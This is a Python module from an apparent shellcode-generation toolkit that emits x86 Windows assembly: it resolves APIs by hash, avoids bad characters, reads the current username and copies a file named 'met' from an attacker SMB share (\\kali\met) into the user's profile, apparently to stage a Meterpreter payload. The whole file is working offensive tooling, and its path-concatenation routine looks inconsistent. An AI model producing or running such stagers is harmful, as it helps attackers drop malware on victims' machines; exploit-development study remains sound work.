from coder import call_exit_func, find_and_call
from coder.util import (
    convert_ip_addr_bytes,
    convert_port_hex,
    find_hash_key,
    push_hash,
    push_string,
)


def generate(bad_chars, exit_func, debug=False):
    hash_key = find_hash_key(
        [
            ("ADVAPI32.DLL", "GetUserNameA"),
            ("KERNEL32.DLL", "CopyFileExA"),
            ("KERNEL32.DLL", "CreateProcessA"),
        ]
        + ([exit_func] if exit_func else []),
        bad_chars,
    )

    return f"""
    start:
        {'int3' if debug else ''}       // Breakpoint for Windbg
        mov   ebp, esp
        add   esp, 0xfffff9f0           // Avoid NULL bytes

    {find_and_call.generate(hash_key)}

    get_username:                       // BOOL GetUserNameA([out] LPSTR   lpBuffer, [in, out] LPDWORD pcbBuffer);
        xor eax, eax                    // Zeroify eax
        mov eax, 0x200                  // Initialization of pcbBuffer
        push eax                        // pcbBuffer (arg2)
        xor eax, eax                    // Zeroify eax
        sub esp, 0x200                  // BufferAllocation to contain Desktop path
        lea eax, [esp]                  // put @lpBuffer in eax
        mov esi, eax                    // We save @lpBuffer for later uses
        push eax                        // lpBuffer (arg1)
        {push_hash('ADVAPI32.DLL', 'GetUserNameA', hash_key)}
        call dword ptr [ebp+0x04]       // Call GetUserNameA
    
    construct_destination_path:         // Construct "C:\\Users\\<Username>\\met"
        mov edi, esi                    // Copy username buffer to EDI
        sub esp, 0x200                  // Allocate space for full path
        lea eax, [esp]                  // Address of final buffer
        mov esi, eax                    // Save final buffer address in ESI
        push esi                        // Push final buffer address for later use
        {push_string("C:\\Users\\", bad_chars)} // Base path
        call concat_paths               // Concatenate base path and username

        {push_string("\\met", bad_chars)} // Append sub-path and filename
        call concat_paths               // Concatenate sub-path to full path

    copy_file:                          // BOOL CopyFileExA([in] LPCSTR lpExistingFileName, [in] LPCSTR lpNewFileName, [in, optional] LPPROGRESS_ROUTINE lpProgressRoutine, [in, optional] LPVOID lpData, [in, optional] LPBOOL pbCancel, [in] DWORD dwCopyFlags);
        xor eax, eax                    // Zeroify eax
        push eax                        // dwCopyFlags (arg6)
        push eax                        // pbCancel (arg5)
        push eax                        // lpData (arg4)
        push eax                        // lpProgressRoutine (arg3)
        push esi                        // lpNewFileName (arg2) - DestinationPath
        {push_string("\\\\kali\\met", bad_chars)} // lpExistingFileName (arg1) - Source file path
        {push_hash('KERNEL32.DLL', 'CopyFileExA', hash_key)}
        call dword ptr [ebp+0x04]       // Call CopyFileExA


    {call_exit_func.generate(exit_func, hash_key)}
    
    
    concat_paths:                       // Concatenate two paths
        mov ecx, 0x200                  // Max length for concatenation
    copy_loop:
        lodsb                           // Load byte from source (ESI) into AL
        stosb                           // Store byte in destination (EDI)
        test al, al                     // Check for null terminator
        jnz copy_loop                   // Repeat if not null
        ret                             // Return to caller
    """
